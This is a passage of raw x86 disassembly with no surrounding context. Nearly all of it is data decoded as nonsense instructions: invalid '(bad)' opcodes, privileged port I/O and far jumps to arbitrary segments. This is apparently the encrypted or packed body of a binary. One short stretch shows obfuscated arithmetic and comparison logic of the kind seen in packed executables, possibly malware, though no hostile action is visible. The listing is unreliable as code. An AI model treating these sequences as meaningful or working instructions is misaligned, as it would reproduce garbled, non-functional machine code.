  405980:	add    DWORD PTR [eax-0x582b5b35],ecx
  405986:	jo     0x405957
  405988:	pop    ss
  405989:	xor    al,BYTE PTR [eax]
  40598b:	sar    BYTE PTR [ebx],1
  40598d:	ret    0x7abc
  405990:	aaa    
  405991:	js     0x40591b
  405993:	mov    dh,0xdf
  405995:	outs   dx,BYTE PTR ds:[esi]
  405996:	sbb    esp,DWORD PTR [ebp-0x4706be0b]
  40599c:	sub    DWORD PTR [ebx+0x17c3e218],esi
  4059a2:	sbb    BYTE PTR [ebp+0x258a9539],0x57
  4059a9:	icebp  
  4059aa:	inc    eax
  4059ab:	jg     0x4059b8
  4059ad:	add    al,0xb3
  4059af:	fimul  WORD PTR [edx]
  4059b1:	iret   
  4059b2:	and    esp,DWORD PTR [eax+0x29]
  4059b5:	mov    ebp,0xdc3b264b
  4059ba:	sahf   
  4059bb:	mov    dl,0x52
  4059bd:	retf   0x973d
  4059c0:	jo     0x4059de
  4059c2:	rcr    DWORD PTR [ebx-0x36],1
  4059c5:	fsub   DWORD PTR [edi+0xa0dd24d]
  4059cb:	bound  ecx,QWORD PTR ds:0xaf12c4d4
  4059d1:	xchg   ecx,eax
  4059d2:	cmp    BYTE PTR ds:[edx+0x5ef38ae8],cl
  4059d9:	push   0x5e3a07e5
  4059de:	adc    ebx,ecx
  4059e0:	sub    al,0xa0
  4059e2:	(bad)  
  4059e3:	dec    ebx
  4059e4:	sub    DWORD PTR [ecx],esi
  4059e6:	and    bh,BYTE PTR ds:0x7afe6f9a
  4059ec:	mov    ch,0xef
  4059ee:	cwde   
  4059ef:	mov    dh,0x94
  4059f1:	jmp    0x2b58:0xb0dc81df
  4059f8:	leave  
  4059f9:	push   ebp
  4059fa:	adc    dl,0x89
  4059fd:	fisubr DWORD PTR [edi-0x20a5036b]
  405a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a04:	xor    eax,0x9324b6cc
  405a09:	loope  0x4059c0
  405a0b:	mov    bl,0xd9
  405a0d:	dec    esi
  405a0e:	sub    eax,0x707b60c2
  405a13:	mov    edi,0x33a088bf
  405a18:	test   DWORD PTR [edi+eax*8+0x9],esp
  405a1c:	or     cl,0xe8
  405a1f:	mov    eax,0xa83f3cb1
  405a24:	lods   al,BYTE PTR ds:[esi]
  405a25:	sub    al,0x11
  405a27:	fidiv  DWORD PTR [edi]
  405a29:	xchg   ebp,eax
  405a2a:	popf   
  405a2b:	sti    
  405a2c:	cmp    ebp,ebx
  405a2e:	or     eax,0x68bae06f
  405a33:	jmp    0x1d8b13f1
  405a38:	jl     0x405a72
  405a3a:	lea    ebp,[edx+0x5b]
  405a3d:	and    edi,DWORD PTR [ecx+edi*8-0x6fdb5e6b]
  405a44:	outs   dx,DWORD PTR ds:[esi]
  405a45:	mov    esi,0x89baa631
  405a4a:	push   ebx
  405a4b:	sbb    BYTE PTR [edi-0x6f72ffc7],bl
  405a51:	mov    gs,WORD PTR [eax-0x57ebe88a]
  405a57:	in     al,0x60
  405a59:	sub    cl,BYTE PTR [edx+0x4b693b8a]
  405a5f:	push   esp
  405a60:	enter  0x3278,0x19
  405a64:	mov    ch,BYTE PTR [ecx+0x60]
  405a67:	mov    dh,0x83
  405a69:	jmp    0x405ad8
  405a6b:	jno    0x405ac0
  405a6d:	test   eax,0xb9cc16ea
  405a72:	out    0xaf,eax
  405a74:	dec    ebp
  405a75:	mov    dh,0xf6
  405a77:	in     al,dx
  405a78:	sub    esi,DWORD PTR [eax-0x3b]
  405a7b:	fist   DWORD PTR [edx]
  405a7d:	frstor [ebx-0x38]
  405a80:	ins    BYTE PTR es:[edi],dx
  405a81:	cmp    ecx,esi
  405a83:	sbb    ah,BYTE PTR [eax+0x62f7c754]
  405a89:	sub    eax,0x68d1af0a
  405a8e:	cmp    esp,DWORD PTR [ebx+0x3736f8f]
  405a94:	mov    esi,0xd9a48757
  405a99:	ins    BYTE PTR es:[edi],dx
  405a9a:	in     al,dx
  405a9b:	out    dx,eax
  405a9c:	test   BYTE PTR [esi-0x3b],0x3c
  405aa0:	repz cs test eax,0x72bf724a
  405aa7:	add    dl,BYTE PTR [ecx]
  405aa9:	outs   dx,DWORD PTR ds:[esi]
  405aaa:	pusha  
  405aab:	idiv   BYTE PTR [esi-0x63]
  405aae:	sub    DWORD PTR [ecx-0x4d],edx
  405ab1:	es jecxz 0x405a4d
  405ab4:	ret    
  405ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ab6:	jmp    0x5579e2c
  405abb:	and    DWORD PTR [ecx-0x2a],esi
  405abe:	daa    
  405abf:	pop    ecx
  405ac0:	push   es
  405ac1:	(bad)  
  405ac2:	imul   BYTE PTR [edi+0x7e71c003]
  405ac8:	fs test eax,0x6ce51ca9
  405ace:	inc    edi
  405acf:	leave  
  405ad0:	sbb    eax,0x47607fb
  405ad5:	and    eax,0x56671493
  405ada:	sar    BYTE PTR [esi],cl
  405adc:	fcomi  st,st(2)
  405ade:	je     0x405ada
  405ae0:	inc    edx
  405ae1:	in     eax,0xcd
  405ae3:	push   ecx
  405ae4:	in     eax,0xa3
  405ae6:	mov    al,0x47
  405ae8:	aas    
  405ae9:	lods   eax,DWORD PTR ds:[esi]
  405aea:	jle    0x405a84
  405aec:	daa    
  405aed:	in     eax,0xfa
  405aef:	arpl   WORD PTR [eax],sp
  405af1:	arpl   WORD PTR [edx+0x5df26498],bx
  405af7:	jge    0x405b0d
  405af9:	xchg   ebx,eax
  405afa:	cmp    al,0x54
  405afc:	nop
  405afd:	(bad)  [eax+0xc]
  405b00:	and    DWORD PTR [ecx],edx
  405b02:	std    
  405b03:	and    eax,0xd63ccd6
  405b08:	inc    ebp
  405b09:	xor    ah,BYTE PTR [edx+0x5d471e61]
  405b0f:	xor    cl,BYTE PTR [edx]
  405b11:	(bad)  
  405b12:	mov    ds:0xf68979c4,eax
  405b17:	sbb    cl,BYTE PTR [ebx-0x66819f55]
  405b1d:	les    esp,FWORD PTR [ebx+0xf]
  405b20:	fldenv [edi-0x1]
  405b23:	dec    ebx
  405b24:	into   
  405b25:	add    dl,0x2b
  405b28:	int    0x97
  405b2a:	cmp    ecx,eax
  405b2c:	fs std 
  405b2e:	xchg   esi,eax
  405b2f:	cmc    
  405b30:	cmp    edx,DWORD PTR [esi-0x77]
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x704454c1
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405be4
  405be0:	das    
  405be1:	into   
  405be2:	adc    eax,0x598fe34c
  405be7:	dec    ebp
  405be8:	pusha  
  405be9:	pop    esi
  405bea:	test   DWORD PTR [ebx],edx
  405bec:	fmulp  st(4),st
  405bee:	jp     0x405c0a
  405bf0:	mov    dl,0xe
  405bf2:	xchg   ecx,eax
  405bf3:	dec    esi
  405bf4:	hlt    
  405bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf6:	pop    edx
  405bf7:	int    0xbe
  405bf9:	pop    edi
  405bfa:	outs   dx,DWORD PTR ds:[esi]
  405bfb:	jmp    0x71b5:0x8b43df96
  405c02:	jnp    0x405c67
  405c04:	or     eax,0x432441f1
  405c09:	cmp    DWORD PTR ss:[eax+ebx*4+0x15],0x72
  405c0f:	ror    bl,0x76
  405c12:	aam    0xd5
  405c14:	(bad)  
  405c15:	pop    ebx
  405c16:	sbb    al,0xba
  405c18:	adc    eax,DWORD PTR gs:[eax]
  405c1b:	add    bh,BYTE PTR [eax+0x3922cb25]
  405c21:	ja     0x405c70
  405c23:	leave  
  405c24:	xchg   DWORD PTR [esp+ebx*8+0x461da7b3],edx
  405c2b:	retf   0x6573
  405c2e:	pop    edx
  405c2f:	arpl   WORD PTR [esi-0x25],cx
  405c32:	retf   0xae24
  405c35:	jno    0x405c43
  405c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c38:	mov    DWORD PTR [ecx+0x16b03cb0],edx
  405c3e:	scas   al,BYTE PTR es:[edi]
  405c3f:	cmc    
  405c40:	stos   DWORD PTR es:[edi],eax
  405c41:	pop    edx
  405c42:	adc    al,0x73
  405c44:	aaa    
  405c45:	stos   DWORD PTR es:[edi],eax
  405c46:	test   DWORD PTR [esi+0x4b],ebp
  405c49:	mov    edi,0x7a284a8d
  405c4e:	xchg   ecx,eax
  405c4f:	sub    al,0x4e
  405c51:	or     eax,0xc0b1c256
  405c56:	cmp    edx,DWORD PTR [ebx+0x4]
  405c59:	mov    eax,0x6dbdd659
  405c5e:	(bad)  
  405c5f:	push   edi
  405c60:	xor    eax,0x2f97d4ea
  405c65:	jae    0x405c1b
  405c67:	in     eax,dx
  405c68:	sbb    edi,DWORD PTR [eax+eiz*8-0x58eafde3]
  405c6f:	stos   DWORD PTR es:[edi],eax
  405c70:	mov    ch,0xc8
  405c72:	rol    DWORD PTR [edx-0x4ea7bd16],0x3d
  405c79:	or     al,0x13
  405c7b:	loop   0x405c9f
  405c7d:	mov    dl,0x76
  405c7f:	arpl   WORD PTR [ebx],bx
  405c81:	add    eax,0x74dc6b8c
  405c86:	push   es
  405c87:	gs add bh,bl
  405c8a:	aad    0x7c
  405c8c:	(bad)  
  405c8d:	lock or eax,0xa645b285
  405c93:	mov    DWORD PTR [ebx-0x2a],esi
  405c96:	ret    0x7be
  405c99:	(bad)  
  405c9a:	lods   al,BYTE PTR ds:[esi]
  405c9b:	gs sar eax,1
  405c9e:	mov    dl,BYTE PTR [edx*1-0xdb67e01]
  405ca5:	pop    esi
  405ca6:	aas    
  405ca7:	data16 data16 or al,cl
  405cab:	mov    ds:0x931625f1,al
  405cb0:	push   edi
  405cb1:	mov    bh,0xfd
  405cb3:	xchg   edi,eax
  405cb4:	pop    eax
  405cb5:	jae    0x405cb6
  405cb7:	xchg   ebp,eax
  405cb8:	shl    bl,cl
  405cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbb:	push   ss
  405cbc:	lock hlt 
  405cbe:	cmp    BYTE PTR [ebx],ah
  405cc0:	out    0x8c,eax
  405cc2:	nop
  405cc3:	add    BYTE PTR [ebx-0x6ef0d23],bh
  405cc9:	stos   DWORD PTR es:[edi],eax
  405cca:	aad    0xf1
  405ccc:	repz cmp eax,0xfd4c9a04
  405cd2:	push   esp
  405cd3:	jnp    0x405d1e
  405cd5:	push   0x3bd8cc17
  405cda:	mov    BYTE PTR [ecx-0x719e41a9],al
  405ce0:	adc    esp,eax
  405ce2:	xor    BYTE PTR [ebp-0x59f2838a],cl
  405ce8:	pop    esi
  405ce9:	dec    eax
  405cea:	push   0xbd33ff6b
  405cef:	shl    DWORD PTR [eax-0x1cd37d6b],1
  405cf5:	ror    ch,0x12
  405cf8:	cld    
  405cf9:	js     0x405d19
  405cfb:	jnp    0x405cc4
  405cfd:	mov    edi,0x52d4c390
  405d02:	sti    
  405d03:	pop    ebx
  405d04:	cmp    BYTE PTR [esi+eiz*2],dl
  405d07:	cs ds loope 0x405d7c
  405d0b:	push   cs
  405d0c:	dec    ebp
  405d0d:	mov    cs,eax
  405d0f:	jmp    0x4678:0x223100f5
  405d16:	pop    edi
  405d17:	mov    ebp,0xf6bf31e3
  405d1c:	out    0x77,eax
  405d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d1f:	add    eax,0x941124d2
  405d24:	push   esp
  405d25:	pop    ss
  405d26:	pop    ss
  405d27:	dec    esp
  405d28:	mov    es,WORD PTR [ecx]
  405d2a:	stc    
  405d2b:	mov    DWORD PTR cs:[edx-0x5fdb2dd7],eax
  405d32:	iret   
  405d33:	dec    esi
  405d34:	mov    ch,0x2d
  405d36:	xor    BYTE PTR [esi],dh
  405d38:	push   eax
  405d39:	inc    edx
  405d3a:	cvtpi2ps xmm1,QWORD PTR [edx+0x7e]
  405d3e:	adc    dl,BYTE PTR [ebp+0x58287488]
  405d44:	add    eax,edi
  405d46:	out    0xfe,eax
  405d48:	or     eax,0x455d2ed7
  405d4d:	rcr    BYTE PTR [eax-0x215c791f],0xb5
  405d54:	push   cs
  405d55:	or     DWORD PTR [ebp-0x73256351],esp
  405d5b:	jecxz  0x405d4e
  405d5d:	push   esp
  405d5e:	adc    al,0x65
  405d60:	mov    esi,0x228851b3
  405d65:	in     eax,0x97
  405d67:	xchg   ebx,eax
  405d68:	popa   
  405d69:	jns    0x405d3d
  405d6b:	add    DWORD PTR [edx+esi*4-0x3b],esi
  405d6f:	cmp    al,0xd0
  405d71:	(bad)  
  405d72:	and    BYTE PTR [esi+0x45de4ff6],dh
  405d78:	pop    ecx
  405d79:	out    dx,al
  405d7a:	hlt    
  405d7b:	pop    es
  405d7c:	add    ebx,DWORD PTR [esi+0x65]
  405d7f:	xor    al,0xf1
  405d81:	mov    dl,0x60
  405d83:	jecxz  0x405dfc
  405d85:	mov    esi,0xe8c2345
  405d8a:	xlat   BYTE PTR ds:[ebx]
  405d8b:	std    
  405d8c:	aad    0xa5
  405d8e:	cmp    BYTE PTR [eax],0x9d
  405d91:	inc    ebp
  405d92:	in     eax,dx
  405d93:	mov    dl,0x2f
  405d95:	pop    edi
  405d96:	mov    bl,0x19
  405d98:	out    0x14,al
  405d9a:	xor    ecx,DWORD PTR [ebp+0x36a4c75f]
  405da0:	mov    bl,0x74
  405da2:	mov    ebx,0x6fe01772
  405da7:	scas   eax,DWORD PTR es:[edi]
  405da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da9:	jo     0x405d63
  405dab:	mov    cl,0x70
  405dae:	mov    DWORD PTR [edx],ecx
  405db0:	pop    esi
  405db1:	sar    DWORD PTR [esi-0x4a],0x2e
  405db5:	inc    esp
  405db6:	fcmove st,st(0)
  405db8:	jb     0x405e13
  405dba:	js     0x405de6
  405dbc:	jb     0x405d8c
  405dbe:	pop    edx
  405dbf:	sub    al,0x59
  405dc1:	jo     0x405d9e
  405dc3:	clc    
  405dc4:	mov    cl,0x7c
  405dc6:	dec    ebx
  405dc7:	mov    ah,0xce
  405dc9:	cs dec esp
  405dcb:	imul   esi,ebx,0xeabbf2e8
  405dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dd2:	(bad)  
  405dd3:	pmuludq mm6,mm4
  405dd6:	(bad)  
  405dd7:	xchg   edi,eax
  405dd8:	jno    0x405e06
  405dda:	or     al,0x44
  405ddc:	test   BYTE PTR [ebp+0x7ba1c262],al
  405de2:	stos   DWORD PTR es:[edi],eax
  405de3:	mov    esp,0xd6136204
  405de8:	retf   
  405de9:	pop    ds
  405dea:	jge    0x405e0e
  405dec:	add    eax,0x7fa0c563
  405df1:	icebp  
  405df2:	lea    ebp,[esi+edi*1]
  405df5:	xchg   edi,eax
  405df6:	call   0xf48:0x45f6e99a
  405dfd:	call   0x3367:0x8fcb1182
  405e04:	xor    eax,DWORD PTR [edi+0x1fbaca6]
  405e0a:	cmp    DWORD PTR [eax+eax*2+0x6b],0x4a22797d
  405e12:	fld    DWORD PTR [edi+0x66303578]
  405e19:	out    dx,al
  405e1a:	ret    
  405e1b:	sti    
  405e1c:	mov    dl,0xbc
  405e1e:	mov    gs,WORD PTR [eax+ecx*2+0x56]
  405e22:	or     eax,0x854a1d0b
  405e27:	add    DWORD PTR [eax],0x7d0c1688
  405e2d:	std    
  405e2e:	loopne 0x405e71
  405e30:	xor    al,0x1d
  405e32:	cmp    bh,BYTE PTR [edx-0x59]
  405e35:	inc    ecx
  405e36:	xor    ebx,edi
  405e38:	enter  0x2779,0xe5
  405e3c:	inc    ecx
  405e3d:	xchg   DWORD PTR [ebx],esi
  405e3f:	push   esp
  405e40:	rcl    BYTE PTR [ebx],1
  405e42:	iret   
  405e43:	sbb    al,0x27
  405e45:	and    ah,BYTE PTR [eax]
  405e47:	call   0x615d482a
  405e4c:	mov    ds:0xb7321ef6,eax
  405e51:	adc    cl,BYTE PTR [edi+0x7324f9d7]
  405e57:	hlt    
  405e58:	pop    esi
  405e59:	int3   
  405e5a:	push   ds
  405e5b:	(bad)  
  405e5c:	cwde   
  405e5d:	push   es
  405e5e:	dec    esp
  405e5f:	scas   al,BYTE PTR es:[edi]
  405e60:	fwait
  405e61:	pop    eax
  405e62:	xlat   BYTE PTR ds:[ebx]
  405e63:	xchg   DWORD PTR [eax],esi
  405e65:	fld    QWORD PTR [esi+0x6e74b282]
  405e6b:	cld    
  405e6c:	xor    al,0xd7
  405e6e:	out    dx,al
  405e6f:	cmp    ah,BYTE PTR [edi+0x17c5332]
  405e75:	inc    cl
  405e77:	out    0xe3,eax
  405e79:	xchg   ebp,eax
  405e7a:	pop    eax
  405e7b:	dec    esp
  405e7c:	(bad)  
  405e7d:	fadd   QWORD PTR [esi]
  405e7f:	ret    0xc4aa
  405e82:	mov    esi,0x5ba0744d
  405e87:	add    al,0x6a
  405e89:	jle    0x405e48
  405e8b:	xlat   BYTE PTR ds:[ebx]
  405e8c:	xor    ecx,DWORD PTR [eax]
  405e8e:	mov    esp,0x11fb0f4b
  405e93:	or     al,0x4
  405e95:	adc    DWORD PTR [edi],0x500f2193
  405e9b:	and    DWORD PTR [eax],ecx
  405e9d:	mov    ebp,0x83581a1c
  405ea2:	std    
  405ea3:	pop    ss
  405ea4:	mov    ah,0x7f
  405ea6:	call   0x65382aca
  405eab:	xchg   edx,eax
  405eac:	jge    0x405e87
  405eae:	mov    ch,0x24
  405eb0:	mov    ebx,0x9d437b88
  405eb5:	sub    DWORD PTR [eax-0x574fd41b],ebx
  405ebb:	das    
  405ebc:	or     DWORD PTR [eax-0x7aef44bb],esi
  405ec2:	dec    esp
  405ec3:	call   0x70d7:0x76289312
  405eca:	dec    ebp
  405ecb:	mov    bh,0xf8
  405ecd:	int3   
  405ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ecf:	push   edx
  405ed0:	or     esp,DWORD PTR [bp+si+0x759d]
  405ed5:	fiadd  DWORD PTR [ecx+0x17317d6e]
  405edb:	jg     0x405f2d
  405edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ede:	xchg   esp,eax
  405edf:	addr16 mov ebx,esp
  405ee2:	push   esp
  405ee3:	add    BYTE PTR [ebp+0x5ce9275e],dh
  405ee9:	add    BYTE PTR [eax],0xf2
  405eec:	cs out dx,al
  405eee:	jmp    0x71df10a5
  405ef3:	pop    ecx
  405ef4:	out    0x11,eax
  405ef6:	mov    ebx,DWORD PTR [eax-0x6f3cfb19]
  405efc:	dec    edx
  405efd:	push   ecx
  405efe:	fs mov bl,0x80
  405f01:	dec    esi
  405f02:	nop
  405f03:	aad    0xea
  405f05:	fcom   DWORD PTR [ecx-0x3054145e]
  405f0b:	sti    
  405f0c:	dec    edx
  405f0d:	push   0x0
  405f0f:	adc    BYTE PTR [edx+0x33],bl
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx-0x599e2a8e],fs
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f33:	adc    ebx,DWORD PTR [ebp+0x40e63788]
  405f39:	push   edi
  405f3a:	mov    DWORD PTR [esi-0x4b6028cc],ebp
  405f40:	jl     0x405f18
  405f42:	sbb    BYTE PTR [eax+0x3bc66885],bh
  405f48:	xchg   ebp,eax
  405f49:	bound  eax,QWORD PTR [ebp-0x1e0c08f8]
  405f4f:	into   
  405f50:	mov    dh,0x47
  405f52:	cld    
  405f53:	(bad)  
  405f54:	fisttp WORD PTR [edx+edi*1-0x5de85eea]
  405f5b:	les    eax,FWORD PTR [ebp+0x2c]
  405f5e:	loop   0x405ee4
  405f60:	adc    al,0x58
  405f62:	les    esp,FWORD PTR [ebx]
  405f64:	add    ebp,DWORD PTR [edx+eiz*8-0x6ea49a22]
  405f6b:	pop    esi
  405f6c:	mov    DWORD PTR [ebx+ebx*8+0x70],ebx
  405f70:	jno    0x405fd2
  405f72:	push   ds
  405f73:	mov    edi,0xa3fe9c20
  405f78:	(bad)  
  405f79:	shl    DWORD PTR [ecx+0x1819a62],1
  405f7f:	call   FWORD PTR [eax]
  405f81:	jo     0x405f4e
  405f83:	pop    ecx
  405f84:	dec    esi
  405f85:	cmp    DWORD PTR ds:0xa52cf7a9,ecx
  405f8b:	mov    ch,ah
  405f8d:	mov    bh,0x6a
  405f8f:	outs   dx,DWORD PTR ds:[esi]
  405f90:	repnz gs popa 
  405f93:	clc    
  405f94:	mov    cl,BYTE PTR [eax-0x3636f4e5]
  405f9a:	scas   al,BYTE PTR es:[edi]
  405f9b:	mov    ah,BYTE PTR [eax]
  405f9d:	sbb    cl,BYTE PTR [ebx+0x3a9eb55c]
  405fa3:	stc    
  405fa4:	icebp  
  405fa5:	sbb    eax,0xe3dfe4b2
  405faa:	call   0x165bc6da
  405faf:	jmp    0xf3580648
  405fb4:	cli    
  405fb5:	push   cs
  405fb6:	inc    esi
  405fb7:	mov    ah,0x5d
  405fb9:	cmovbe eax,edi
  405fbc:	pop    ebp
  405fbd:	inc    edx
  405fbe:	jb     0x406024
  405fc0:	xchg   ecx,eax
  405fc1:	out    dx,al
  405fc2:	or     ch,ch
  405fc4:	sbb    esp,DWORD PTR [edi]
  405fc6:	test   al,0xd4
  405fc8:	adc    esi,DWORD PTR [ebx]
  405fca:	mov    eax,0x56fc0f26
  405fcf:	inc    esp
  405fd0:	gs aas 
  405fd2:	popf   
  405fd3:	sahf   
  405fd4:	ja     0x406029
  405fd6:	idiv   al
  405fd8:	out    dx,al
  405fd9:	dec    ebx
  405fda:	pushf  
  405fdb:	pop    esi
  405fdc:	loopne 0x405fbf
  405fde:	mov    al,0x29
  405fe0:	jnp    0x405fb9
  405fe2:	mov    ah,0x23
  405fe4:	in     eax,dx
  405fe5:	adc    esp,DWORD PTR [ebx-0x430b9140]
  405feb:	(bad)  
  405fec:	jecxz  0x40604c
  405fee:	inc    ecx
  405fef:	jp     0x405f79
  405ff1:	pop    es
  405ff2:	enter  0x5a52,0x31
  405ff6:	fsubr  st,st(3)
  405ff8:	adc    al,0x25
  405ffa:	pop    esi
  405ffb:	push   ecx
  405ffc:	jle    0x406001
  405ffe:	call   DWORD PTR [ecx-0x48]
  406001:	cmp    DWORD PTR [eax],esi
  406003:	mov    bl,0x23
  406005:	lds    ebx,FWORD PTR [ecx+0xcd3f393]
  40600b:	sbb    eax,0x580429ba
  406010:	xor    BYTE PTR [esi],al
  406012:	(bad)  [esi]
  406014:	ss pop esi
  406016:	push   0x2f6749c4
  40601b:	(bad)  
  40601c:	(bad)  
  40601e:	imul   eax,esp,0x22831731
  406024:	lods   al,BYTE PTR ds:[esi]
  406025:	cmp    BYTE PTR [ecx-0x7b1bb31c],ah
  40602b:	jbe    0x405ffa
  40602d:	fisubr WORD PTR [ebp+edi*8-0x62ef21fc]
  406034:	fld    st(1)
  406036:	out    0x4f,eax
  406038:	mov    cl,0xb7
  40603a:	repnz div BYTE PTR [ebp-0x7f]
  40603e:	mov    cs:0xba2a751f,al
  406044:	(bad)  
  406045:	repz cli 
  406047:	test   DWORD PTR [eax+ebx*1+0x57e1f78f],ebp
  40604e:	mov    ds:0xa65d0a2,al
  406053:	sbb    dl,BYTE PTR [ebp-0x1d]
  406056:	repnz leave 
  406058:	inc    ecx
  406059:	or     dh,BYTE PTR [ebx-0x72]
  40605c:	je     0x4060af
  40605e:	out    0x9,eax
  406060:	test   DWORD PTR [ebp-0xe2eaf1f],esi
  406066:	(bad)  
  406067:	cmp    DWORD PTR [eax],edi
  406069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40606a:	data16 mov cl,0x21
  40606d:	rol    ecx,cl
  40606f:	sbb    ebp,DWORD PTR [ebp+ecx*2+0x41d71af2]
  406076:	inc    edi
  406077:	or     eax,0x7e0790ab
  40607c:	int3   
  40607d:	pop    edi
  40607e:	retf   
  40607f:	mov    al,0x89
  406081:	shl    DWORD PTR [ebp+0x4f],1
  406084:	pop    esi
  406085:	and    ebp,esp
  406087:	(bad)  
  406088:	jo     0x4060af
  40608a:	ficomp WORD PTR [ecx+0x6d584cfb]
  406090:	sub    eax,0x95d12033
  406095:	inc    esp
  406096:	je     0x4060a5
  406098:	imul   eax,DWORD PTR [ecx+0x22e7decc],0xa2c6c784
  4060a2:	test   al,0xfd
  4060a4:	in     al,dx
  4060a5:	xchg   ebp,eax
  4060a6:	lods   al,BYTE PTR ds:[esi]
  4060a7:	dec    ecx
  4060a8:	std    
  4060a9:	js     0x406098
  4060ab:	mov    ch,0x93
  4060ad:	imul   edx,eax,0xc
  4060b0:	inc    edx
  4060b2:	push   0x73
  4060b4:	xor    BYTE PTR [esp+edi*2+0x13c8e99f],bh
  4060bb:	mov    al,0x88
  4060bd:	repz (bad) 
  4060c0:	test   al,0xaa
  4060c2:	adc    BYTE PTR [esi],0x1b
  4060c5:	stos   BYTE PTR es:[edi],al
  4060c6:	sub    esi,ebx
  4060c8:	dec    ecx
  4060c9:	aaa    
  4060ca:	adc    bl,BYTE PTR [edx]
  4060cc:	int3   
  4060cd:	mov    BYTE PTR [ebx+0x6ad1a1f4],ah
  4060d3:	mov    ecx,0xebe01bd4
  4060d8:	mul    BYTE PTR [edx+0x7427e6c4]
  4060de:	sub    BYTE PTR [ebx+ebp*8-0x5f],bh
  4060e2:	aaa    
  4060e3:	pop    es
  4060e4:	mov    ecx,0xb2390423
  4060e9:	ja     0x4060a7
  4060eb:	or     ebx,DWORD PTR [edi-0x6d]
  4060ee:	pop    ss
  4060ef:	outs   dx,BYTE PTR ds:[esi]
  4060f0:	adc    al,0xf
  4060f2:	out    0x2c,eax
  4060f4:	fstp   st(2)
  4060f6:	mov    cl,0x49
  4060f8:	out    0x6c,eax
  4060fa:	xchg   esi,eax
  4060fb:	dec    edx
  4060fc:	push   esp
  4060fd:	outs   dx,WORD PTR ds:[esi]
  4060ff:	int    0xf2
  406101:	push   edi
  406102:	push   esi
  406103:	gs shl edx,1
  406106:	imul   ebx,DWORD PTR [eax+0x384737e5],0xd
  40610d:	jg     0x4060d7
  40610f:	popa   
  406110:	jmp    DWORD PTR [ebx-0x73b2d4d6]
  406116:	xchg   edx,eax
  406117:	pop    DWORD PTR [edi]
  406119:	fs out dx,al
  40611b:	fadd   st,st(6)
  40611d:	mov    eax,0x7341f821
  406122:	jl     0x40611b
  406124:	mov    bl,0x7e
  406126:	aad    0xa7
  406128:	adc    BYTE PTR [ecx-0x6ddd752],0x1b
  40612f:	cmp    esp,DWORD PTR [edi+0x5e]
  406132:	pop    eax
  406133:	addr16 ss mov esp,0x88d435ce
  40613a:	pop    ds
  40613b:	jecxz  0x406168
  40613d:	paddsw mm5,QWORD PTR [eax]
  406140:	cmp    edx,0xfffffffe
  406143:	sbb    bh,al
  406145:	cs mov ebx,0x9ae8b0a9
  40614b:	stos   BYTE PTR es:[edi],al
  40614c:	mov    cs,ecx
  40614e:	jae    0x40611d
  406150:	sti    
  406151:	(bad)  
  406152:	sbb    ch,BYTE PTR [esi+ebx*1-0x4]
  406156:	fld    QWORD PTR [edi-0x6]
  406159:	adc    eax,0x64abab54
  40615e:	sub    bh,BYTE PTR [ebx]
  406160:	loopne 0x406150
  406162:	jp     0x4061c2
  406164:	jbe    0x4061d0
  406166:	je     0x406169
  406168:	push   0xc190f5ba
  40616d:	xor    al,0xd9
  40616f:	test   BYTE PTR [ebx-0x7],bl
  406172:	xchg   ecx,eax
  406173:	xchg   ebx,eax
  406174:	ret    0x5ec6
  406177:	popf   
  406178:	dec    edx
  406179:	adc    dh,BYTE PTR [ecx+0x2be4efa5]
  40617f:	pop    es
  406180:	test   DWORD PTR [eax+0x2cc77a5c],ebx
  406186:	jmp    0x406178
  406188:	(bad)  
  406189:	das    
  40618a:	loope  0x4061c1
  40618c:	ficomp WORD PTR [ecx]
  40618e:	out    0x14,eax
  406190:	je     0x4061ae
  406192:	les    edx,FWORD PTR [esi-0x3a2b2bfe]
  406198:	and    DWORD PTR es:[eax],edi
